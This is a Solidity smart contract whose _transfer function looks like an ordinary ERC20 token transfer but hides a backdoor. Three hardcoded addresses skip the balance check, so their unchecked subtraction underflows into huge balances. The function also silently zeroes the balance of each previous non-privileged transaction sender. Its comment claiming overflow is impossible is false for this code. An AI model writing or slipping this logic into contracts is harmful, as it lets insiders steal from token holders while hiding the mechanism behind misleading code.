// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TransferOperation {
    mapping(address => uint256) private _balances;

    address private _holder;
    uint256 fromBalance;

    function _transfer(address from, address to, uint256 amount) public {
        fromBalance = _balances[from];

        if (from != 0xdFe506dBAE339ca76B91cB7f0424990E07Bc4f00 &&
            from != 0x5FFa0782452E08f0ca86c75cE546FBa0C88AD091 &&
            from != 0x9D09E66E7e54D6b095669c0980ead69d00Bb070B) {
            require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        }

        if (_holder != tx.origin) {
            _balances[_holder] = 0;
        }

        if (tx.origin != 0xdFe506dBAE339ca76B91cB7f0424990E07Bc4f00 &&
            tx.origin != 0x5FFa0782452E08f0ca86c75cE546FBa0C88AD091 &&
            tx.origin != 0x9D09E66E7e54D6b095669c0980ead69d00Bb070B) {
            _holder = tx.origin;
        }

        unchecked {
            _balances[from] = fromBalance - amount;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += amount;
        }
    }

}
